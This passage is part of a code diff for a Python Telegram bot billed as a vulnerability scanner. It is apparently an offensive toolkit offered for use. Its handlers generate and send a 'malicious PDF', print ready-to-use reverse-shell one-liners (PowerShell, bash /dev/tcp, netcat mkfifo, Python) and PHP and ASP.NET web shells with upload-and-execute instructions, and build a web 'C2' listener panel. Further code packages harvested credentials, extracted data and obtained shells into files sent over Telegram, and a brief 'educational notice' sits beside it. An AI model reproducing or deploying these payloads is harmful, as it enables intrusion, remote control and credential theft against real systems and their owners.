+                    'location': cred.get('location', 'Unknown')
+                })
+
+        # VPS/VDS credentials
+        if hasattr(self, 'vps_exploit_results') and self.vps_exploit_results.get('credentials_found'):
+            for cred in self.vps_exploit_results['credentials_found']:
+                found_credentials.append({
+                    'source': f"{cred.get('service', 'Unknown')} Service",
+                    'data': f"{cred.get('username', '')}:{cred.get('password', '')}",
+                    'location': f"Port {cred.get('port', 'Unknown')}"
+                })
+
+        if found_credentials:
+            creds_report += f"\n**📋 Discovered Credentials:**\n"
+            for i, cred in enumerate(found_credentials[:10], 1):
+                creds_report += f"{i}. **{cred['source']}**\n"
+                creds_report += f"   • Data: `{cred['data']}`\n"
+                creds_report += f"   • Location: {cred['location']}\n\n"
+
+        return creds_report if found_credentials else ""
+
+    async def _handle_payload_selection(self, query: Update, data: str):
+        """Handle payload type selection"""
+        user_id = query.from_user.id
+        payload_type = data.split("_")[1]
+
+        if payload_type == "pdf":
+            await self._generate_malicious_pdf(query)
+        elif payload_type == "powershell":
+            await self._show_powershell_payloads(query)
+        elif payload_type == "bash":
+            await self._show_bash_payloads(query)
+        elif payload_type == "python":
+            await self._show_python_payloads(query)
+        elif payload_type == "webshell":
+            await self._show_webshell_payloads(query)
+        elif payload_type == "listener":
+            await self._create_listener_panel(query)
+
+    async def _generate_malicious_pdf(self, query: Update):
+        """Generate malicious PDF payload"""
+        await query.edit_message_text("🎯 **Generating Malicious PDF...**")
+
+        try:
+            # Generate PDF with default settings
+            result = self.payload_generator.generate_malicious_pdf("0.0.0.0", 4444, "universal")
+
+            if result['success']:
+                success_text = f"""
+✅ **Malicious PDF Generated Successfully!**
+
+**File Details:**
+• **Filename:** `{result['filename']}`
+• **Size:** {result['size']} bytes
+• **Target OS:** {result['target_os']}
+• **Listener:** {result['listener_info']}
+• **SHA256:** `{result['hash'][:16]}...`
+
+**Exploits Included:**
+"""
+                for exploit in result['exploits_used']:
+                    success_text += f"• {exploit}\n"
+
+                success_text += f"""
+**Usage Instructions:**
+"""
+                for instruction in result['instructions']:
+                    success_text += f"{instruction}\n"
+
+                await query.edit_message_text(success_text, parse_mode=ParseMode.MARKDOWN)
+
+                # Send the PDF file
+                if os.path.exists(result['file_path']):
+                    with open(result['file_path'], 'rb') as pdf_file:
+                        await query.message.reply_document(
+                            document=pdf_file,
+                            filename=result['filename'],
+                            caption="🎯 **Malicious PDF Payload** - Use responsibly!"
+                        )
+            else:
+                await query.edit_message_text(f"❌ **PDF Generation Failed:** {result.get('error', 'Unknown error')}")
+
+        except Exception as e:
+            await query.edit_message_text(f"❌ **Error generating PDF:** {str(e)}")
+
+    async def _show_powershell_payloads(self, query: Update):
+        """Show PowerShell payloads"""
+        payload_result = self.payload_generator.generate_additional_payloads()
+
+        if payload_result['success']:
+            powershell_text = """
+💻 **PowerShell Reverse Shell Payloads**
+
+⚠️ **For Windows targets only!**
+
+**Basic PowerShell Reverse Shell:**
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient("LHOST",LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+**Usage:**
+1. Replace LHOST with your IP
+2. Replace LPORT with your port
+3. Execute on target Windows machine
+4. Start netcat listener: `nc -lvnp LPORT`
+            """
+
+            await query.edit_message_text(powershell_text, parse_mode=ParseMode.MARKDOWN)
+        else:
+            await query.edit_message_text("❌ Failed to generate PowerShell payloads")
+
+    async def _show_bash_payloads(self, query: Update):
+        """Show Bash payloads"""
+        bash_text = """
+🐧 **Bash/Linux Reverse Shell Payloads**
+
+**Method 1 - Bash TCP:**
+```bash
+bash -i >& /dev/tcp/LHOST/LPORT 0>&1
+```
+
+**Method 2 - Netcat:**
+```bash
+nc -e /bin/sh LHOST LPORT
+```
+
+**Method 3 - Netcat (if -e not available):**
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f
+```
+
+**Method 4 - Python:**
+```bash
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+```
+
+**Usage:**
+1. Replace LHOST with your IP
+2. Replace LPORT with your port
+3. Start listener: `nc -lvnp LPORT`
+4. Execute on target
+        """
+
+        await query.edit_message_text(bash_text, parse_mode=ParseMode.MARKDOWN)
+
+    async def _show_python_payloads(self, query: Update):
+        """Show Python payloads"""
+        python_text = """
+🐍 **Python Reverse Shell Payloads**
+
+**Basic Python Shell:**
+```python
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("LHOST",LPORT))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+import pty
+pty.spawn("/bin/bash")
+```
+
+**Windows Python Shell:**
+```python
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("LHOST",LPORT))
+while True:
+    command = s.recv(1024).decode()
+    if 'terminate' in command:
+        s.close()
+        break
+    else:
+        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        s.send(CMD.stdout.read())
+        s.send(CMD.stderr.read())
+```
+
+**Usage:**
+1. Replace LHOST with your IP
+2. Replace LPORT with your port
+3. Start listener: `nc -lvnp LPORT`
+4. Execute: `python shell.py`
+        """
+
+        await query.edit_message_text(python_text, parse_mode=ParseMode.MARKDOWN)
+
+    async def _show_webshell_payloads(self, query: Update):
+        """Show web shell payloads"""
+        webshell_text = """
+🌐 **Web Shell Payloads**
+
+**PHP Simple Shell:**
+```php
+<?php
+if(isset($_REQUEST['cmd'])){
+    echo "<pre>";
+    $cmd = ($_REQUEST['cmd']);
+    system($cmd);
+    echo "</pre>";
+    die;
+}
+?>
+<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+```
+
+**ASP.NET Shell:**
+```aspx
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<%@ Import Namespace="System.IO" %>
+<script Language="C#" runat="server">
+void Page_Load(object sender, EventArgs e)
+{
+    string cmd = Request["cmd"];
+    if (cmd != null)
+    {
+        Response.Write("<pre>");
+        Process proc = new Process();
+        proc.StartInfo.FileName = "cmd.exe";
+        proc.StartInfo.Arguments = "/c " + cmd;
+        proc.StartInfo.UseShellExecute = false;
+        proc.StartInfo.RedirectStandardOutput = true;
+        proc.Start();
+        Response.Write(proc.StandardOutput.ReadToEnd());
+        Response.Write("</pre>");
+    }
+}
+</script>
+<form><input name="cmd" size="50"><input type=submit value="Execute"></form>
+```
+
+**Usage:**
+1. Upload to web server
+2. Access via browser
+3. Execute commands through web interface
+        """
+
+        await query.edit_message_text(webshell_text, parse_mode=ParseMode.MARKDOWN)
+
+    async def _create_listener_panel(self, query: Update):
+        """Create listener panel"""
+        await query.edit_message_text("🎛️ **Creating Listener Panel...**")
+
+        try:
+            panel_result = self.payload_generator.create_listener_panel(8080)
+
+            if panel_result['success']:
+                panel_text = f"""
+✅ **Listener Panel Created Successfully!**
+
+**Panel Details:**
+• **Port:** {panel_result['port']}
+• **URL:** http://0.0.0.0:{panel_result['port']}/panel
+• **File:** `{os.path.basename(panel_result['panel_path'])}`
+
+**Instructions:**
+"""
+                for instruction in panel_result['instructions']:
+                    panel_text += f"{instruction}\n"
+
+                await query.edit_message_text(panel_text, parse_mode=ParseMode.MARKDOWN)
+
+                # Send the panel HTML file
+                if os.path.exists(panel_result['panel_path']):
+                    with open(panel_result['panel_path'], 'r') as panel_file:
+                        await query.message.reply_document(
+                            document=io.StringIO(panel_file.read()),
+                            filename="listener_panel.html",
+                            caption="🎛️ **Listener Panel** - Web-based C2 interface"
+                        )
+            else:
+                await query.edit_message_text("❌ Failed to create listener panel")
+
+        except Exception as e:
+            await query.edit_message_text(f"❌ **Error creating panel:** {str(e)}")
+
+    async def _save_and_send_attack_data(self, update: Update, attack_results: Dict, target_url: str):
+        """Save all attack data to files and send them to Telegram"""
+        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+
+        try:
+            # 1. Complete Attack Results JSON
+            complete_results = {
+                "target_url": target_url,
+                "timestamp": datetime.datetime.now().isoformat(),
+                "attack_summary": {
+                    "total_attacks": attack_results.get('total_attacks', 0),
+                    "successful_exploits": attack_results.get('successful_exploits', 0),
+                    "failed_exploits": attack_results.get('failed_exploits', 0),
+                    "success_rate": (attack_results.get('successful_exploits', 0) / max(attack_results.get('total_attacks', 1), 1)) * 100
+                },
+                "extracted_data": attack_results.get('extracted_data', []),
+                "credentials_found": attack_results.get('credentials_found', []),
+                "shells_obtained": attack_results.get('shells_obtained', []),
+                "attack_details": attack_results.get('attack_details', []),
+                "console_output": attack_results.get('console_output', [])
+            }
+
+            complete_json = json.dumps(complete_results, indent=2, ensure_ascii=False)
+            complete_file = io.BytesIO(complete_json.encode('utf-8'))
+            complete_file.name = f"complete_attack_results_{timestamp}.json"
+
+            await update.message.reply_document(
+                document=complete_file,
+                caption="📄 **Complete Attack Results** - Full attack data in JSON format"
+            )
+
+            # 2. Extracted Data File (if any)
+            if attack_results.get('extracted_data'):
+                extracted_data_text = "=== EXTRACTED DATA ===\n\n"
+                for i, data in enumerate(attack_results['extracted_data'], 1):
+                    extracted_data_text += f"{i}. {data}\n\n"
+
+                extracted_file = io.BytesIO(extracted_data_text.encode('utf-8'))
+                extracted_file.name = f"extracted_data_{timestamp}.txt"
+
+                await update.message.reply_document(
+                    document=extracted_file,
+                    caption="💾 **Extracted Data** - All data extracted during attacks"
+                )
+
+            # 3. Credentials File (if any)
+            if attack_results.get('credentials_found'):
+                credentials_text = "=== DISCOVERED CREDENTIALS ===\n\n"
+                for i, cred in enumerate(attack_results['credentials_found'], 1):
+                    credentials_text += f"{i}. Source: {cred.get('source', 'Unknown')}\n"
+                    credentials_text += f"   Data: {cred.get('data', 'N/A')}\n"
+                    credentials_text += f"   Location: {cred.get('location', 'Unknown')}\n\n"
+
+                creds_file = io.BytesIO(credentials_text.encode('utf-8'))
+                creds_file.name = f"credentials_{timestamp}.txt"
+
+                await update.message.reply_document(
+                    document=creds_file,
+                    caption="🔑 **Discovered Credentials** - All credentials found during attacks"
+                )
+
+            # 4. Shells Information (if any)
+            if attack_results.get('shells_obtained'):
+                shells_text = "=== OBTAINED SHELLS ===\n\n"
+                for i, shell in enumerate(attack_results['shells_obtained'], 1):
+                    shells_text += f"{i}. Type: {shell.get('type', 'Unknown')}\n"
+                    shells_text += f"   Status: {shell.get('status', 'Unknown')}\n"
+                    shells_text += f"   Access Level: {shell.get('access_level', 'Unknown')}\n"
+                    if shell.get('url'):
+                        shells_text += f"   URL: {shell['url']}\n"
+                    shells_text += "\n"
+
+                shells_file = io.BytesIO(shells_text.encode('utf-8'))
+                shells_file.name = f"shells_{timestamp}.txt"
+
+                await update.message.reply_document(
+                    document=shells_file,
+                    caption="🐚 **Obtained Shells** - All shells obtained during attacks"
+                )
+
+            # 5. Console Log
+            if attack_results.get('console_output'):
+                console_text = "=== ATTACK CONSOLE LOG ===\n\n"
+                console_text += "\n".join(attack_results['console_output'])
+
+                console_file = io.BytesIO(console_text.encode('utf-8'))
+                console_file.name = f"console_log_{timestamp}.txt"
+
+                await update.message.reply_document(
+                    document=console_file,
+                    caption="📋 **Attack Console Log** - Real-time attack execution log"
+                )
+
+            # 6. HTML Report for easy viewing
+            html_report = self._generate_attack_html_report(attack_results, target_url, timestamp)
+            html_file = io.BytesIO(html_report.encode('utf-8'))
+            html_file.name = f"attack_report_{timestamp}.html"
+
+            await update.message.reply_document(
+                document=html_file,
+                caption="🌐 **HTML Attack Report** - Human-readable attack report"
+            )
+
+            # 7. Summary statistics
+            stats_text = f"""=== ATTACK STATISTICS ===
+
+Target: {target_url}
+Timestamp: {datetime.datetime.now().isoformat()}
+
+Total Attacks Executed: {attack_results.get('total_attacks', 0)}
+Successful Exploits: {attack_results.get('successful_exploits', 0)}
+Failed Exploits: {attack_results.get('failed_exploits', 0)}
+Success Rate: {(attack_results.get('successful_exploits', 0) / max(attack_results.get('total_attacks', 1), 1)) * 100:.1f}%
+
+Data Items Extracted: {len(attack_results.get('extracted_data', []))}
+Credentials Found: {len(attack_results.get('credentials_found', []))}
+Shells Obtained: {len(attack_results.get('shells_obtained', []))}
+
+=== FILES GENERATED ===
+✓ complete_attack_results_{timestamp}.json
+✓ extracted_data_{timestamp}.txt
+✓ credentials_{timestamp}.txt
+✓ shells_{timestamp}.txt
+✓ console_log_{timestamp}.txt
+✓ attack_report_{timestamp}.html
+✓ attack_stats_{timestamp}.txt
+"""
+
+            stats_file = io.BytesIO(stats_text.encode('utf-8'))
+            stats_file.name = f"attack_stats_{timestamp}.txt"
+
+            await update.message.reply_document(
+                document=stats_file,
+                caption="📊 **Attack Statistics** - Summary of all attack activities"
+            )
+
+        except Exception as e:
+            await update.message.reply_text(f"❌ **Error saving attack data:** {str(e)}", parse_mode='Markdown')
+
+    def _generate_attack_html_report(self, attack_results: Dict, target_url: str, timestamp: str) -> str:
+        """Generate HTML report for attack results"""
+        html_report = f"""
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Attack Execution Report</title>
+    <style>
+        body {{ font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }}
+        .container {{ max-width: 1200px; margin: 0 auto; background-color: white; padding: 30px; border-radius: 10px; }}
+        .header {{ text-align: center; border-bottom: 3px solid #dc3545; padding-bottom: 20px; margin-bottom: 30px; }}
+        .success {{ color: #28a745; }}
+        .danger {{ color: #dc3545; }}
+        .warning {{ color: #fd7e14; }}
+        .section {{ margin: 20px 0; padding: 15px; border: 1px solid #dee2e6; border-radius: 5px; }}
+        .console {{ background-color: #000; color: #00ff00; padding: 15px; border-radius: 5px; font-family: monospace; }}
+        .data-item {{ background-color: #f8f9fa; padding: 10px; margin: 5px 0; border-left: 4px solid #007bff; }}
+        .credential {{ background-color: #fff3cd; padding: 10px; margin: 5px 0; border-left: 4px solid #ffc107; }}
+        .shell {{ background-color: #d4edda; padding: 10px; margin: 5px 0; border-left: 4px solid #28a745; }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>⚔️ Attack Execution Report</h1>
+            <p><strong>Target:</strong> {target_url}</p>
+            <p><strong>Timestamp:</strong> {timestamp}</p>
+        </div>
+
+        <div class="section">
+            <h2>📊 Attack Summary</h2>
+            <p><strong>Total Attacks:</strong> {attack_results.get('total_attacks', 0)}</p>
+            <p><strong class="success">Successful Exploits:</strong> {attack_results.get('successful_exploits', 0)}</p>
+            <p><strong class="danger">Failed Exploits:</strong> {attack_results.get('failed_exploits', 0)}</p>
+            <p><strong>Success Rate:</strong> {(attack_results.get('successful_exploits', 0) / max(attack_results.get('total_attacks', 1), 1)) * 100:.1f}%</p>
+        </div>
+"""
+
+        # Extracted Data Section
+        if attack_results.get('extracted_data'):
+            html_report += """
+        <div class="section">
+            <h2>💾 Extracted Data</h2>
+"""
+            for i, data in enumerate(attack_results['extracted_data'], 1):
+                html_report += f'<div class="data-item">{i}. {data}</div>'
+            html_report += "</div>"
+
+        # Credentials Section
+        if attack_results.get('credentials_found'):
+            html_report += """
+        <div class="section">
+            <h2>🔑 Discovered Credentials</h2>
+"""
+            for i, cred in enumerate(attack_results['credentials_found'], 1):
+                html_report += f"""
+<div class="credential">
+    <strong>{i}. {cred.get('source', 'Unknown')}</strong><br>
+    Data: {cred.get('data', 'N/A')}<br>
+    Location: {cred.get('location', 'Unknown')}
+</div>"""
+            html_report += "</div>"
+
+        # Shells Section
+        if attack_results.get('shells_obtained'):
+            html_report += """
+        <div class="section">
+            <h2>🐚 Obtained Shells</h2>
+"""
+            for i, shell in enumerate(attack_results['shells_obtained'], 1):
+                html_report += f"""
+<div class="shell">
+    <strong>{i}. {shell.get('type', 'Unknown')}</strong><br>
+    Status: {shell.get('status', 'Unknown')}<br>
+    Access Level: {shell.get('access_level', 'Unknown')}
+    {f"<br>URL: {shell['url']}" if shell.get('url') else ''}
+</div>"""
+            html_report += "</div>"
+
+        # Console Log Section
+        if attack_results.get('console_output'):
+            html_report += """
+        <div class="section">
+            <h2>📋 Console Output</h2>
+            <div class="console">
+"""
+            html_report += "<br>".join(attack_results['console_output'])
+            html_report += """
+            </div>
+        </div>
+"""
+
+        html_report += """
+        <div class="section">
+            <h3>⚠️ Educational Notice</h3>
+            <p>This report contains results from educational vulnerability testing. All attacks were performed in a controlled environment for learning purposes only.</p>
+        </div>
+    </div>
+</body>
+</html>
+"""
+        return html_report
 
 def main():
-    """Enhanced main function with all features"""
+    """Main function to run the bot"""
     if not TELEGRAM_AVAILABLE:
-        print("❌ Telegram dependencies not available")
+        print("❌ Telegram dependencies not available. Please install python-telegram-bot")
         return
 
+    # Get bot token from environment
     bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
+    enable_bot = os.getenv('ENABLE_TELEGRAM_BOT', 'true').lower() == 'true'
 
     if not bot_token or bot_token == 'YOUR_BOT_TOKEN_HERE':
-        print("❌ Telegram bot token not configured in .env file")
-        return
+        print("⚠️  Telegram bot token not configured")
+        print("📋 To set up the Telegram bot:")
+        print("   1. Message @BotFather on Telegram")
+        print("   2. Send /newbot and follow instructions")
+        print("   3. Copy the token to .env file: TELEGRAM_BOT_TOKEN=your_actual_token")
+        print("   4. Restart the application")
+        if not enable_bot:
+            print("🔇 Telegram bot disabled - continuing with Streamlit only")
+            return
+        else:
+            print("⏳ Telegram bot will retry in 30 seconds...")
+            import time
+            time.sleep(30)
+            return
 
     try:
-        # Initialize bot with all features
-        bot = EnhancedVulnerabilityBot()
+        # Validate token format (basic check)
+        if not bot_token.startswith(('1', '2', '5', '6', '7')) or ':' not in bot_token:
+            print(f"❌ Invalid token format: {bot_token[:10]}...")
+            print("📋 Token should look like: 123456789:ABCdefGHIjklMNOpqrSTUvwxYZ")
+            return
+
+        # Create bot instance
+        bot = VulnerabilityTelegramBot()
+
+        # Create application
         application = Application.builder().token(bot_token).build()
 
-        # Set comprehensive bot commands
-        commands = [
-            BotCommand("start", "🏠 Main menu with all advanced features"),
-            BotCommand("help", "❓ Complete command reference"),
-            BotCommand("scan", "🔍 AI-powered vulnerability scanning"),
-            BotCommand("attack", "⚔️ Smart attack execution"),
-            BotCommand("attack_chain", "⛓️ Multi-stage attack chaining"),
-            BotCommand("zeroday_sim", "🕳️ Zero-day vulnerability simulation"),
-            BotCommand("ai_payload", "🤖 Smart payload generation"),
-            BotCommand("waf_bypass", "🌊 WAF bypass automation"),
-            BotCommand("cloud_audit", "☁️ Multi-cloud security assessment"),
-            BotCommand("mobile_scan", "📱 Mobile app security analysis"),
-            BotCommand("compliance", "📊 Security compliance checking"),
-            BotCommand("osint_deep", "🕵️ Advanced OSINT reconnaissance"),
-            BotCommand("ctf_challenge", "🎮 CTF training challenges"),
-            BotCommand("achievements", "🏆 Security achievements & stats")
-        ]
-
-        # Add all command handlers
+        # Add handlers
         application.add_handler(CommandHandler("start", bot.start_command))
         application.add_handler(CommandHandler("help", bot.help_command))
         application.add_handler(CommandHandler("scan", bot.scan_command))
         application.add_handler(CommandHandler("attack", bot.attack_command))
-        application.add_handler(CommandHandler("attack_chain", bot.attack_chaining_command))
-        application.add_handler(CommandHandler("zeroday_sim", bot.zero_day_simulation_command))
-        application.add_handler(CommandHandler("compliance", bot.compliance_check_command))
-        application.add_handler(CallbackQueryHandler(bot.callback_handler))
+        application.add_handler(CommandHandler("osint", bot.osint_command))
+        application.add_handler(CommandHandler("payload", bot.payload_command))
+        application.add_handler(CommandHandler("config", bot.config_command))
+        application.add_handler(CommandHandler("status", bot.status_command))
+        application.add_handler(CommandHandler("stop", bot.stop_command))
+        application.add_handler(CommandHandler("exploits", bot.exploits_command))
+        application.add_handler(CommandHandler("credentials", bot.credentials_command))
+        application.add_handler(CallbackQueryHandler(bot.button_callback))
         application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.handle_message))
 
-        print("🤖 Enhanced Security Scanner Telegram Bot Starting...")
-        print("🔍 ALL ADVANCED FEATURES ACTIVE:")
-        print("   ✅ Attack Chaining Engine")
-        print("   ✅ AI-Powered Payload Adaptation")
-        print("   ✅ Zero-Day Simulation")
-        print("   ✅ Advanced Evasion Techniques")
-        print("   ✅ Cloud Security Assessment")
-        print("   ✅ Mobile App Analysis")
-        print("   ✅ Compliance Mapping")
-        print("   ✅ CTF Training Mode")
-        print("   ✅ Achievement System")
-        print("   ✅ Threat Intelligence Integration")
+        # Start the bot
+        print("🤖 Starting Vulnerability Scanner Telegram Bot...")
+        print("🔍 Bot is ready to scan for vulnerabilities!")
 
-        # Set commands menu after bot starts
-        async def post_init(application):
-            await application.bot.set_my_commands(commands)
-
-        application.post_init = post_init
-
-        # Run with proper error handling
-        application.run_polling(drop_pending_updates=True)
-
+        # Run the bot
+        application.run_polling()
     except Exception as e:
-        print(f"❌ Bot startup error: {e}")
-        raise
+        if "InvalidToken" in str(e):
+            print(f"❌ Invalid Telegram bot token")
+            print("📋 Please check your token in .env file")
+        else:
+            print(f"❌ Error starting bot: {e}")
+        print("🔇 Telegram bot disabled - Streamlit app will continue running")
 
 if __name__ == '__main__':
     main()
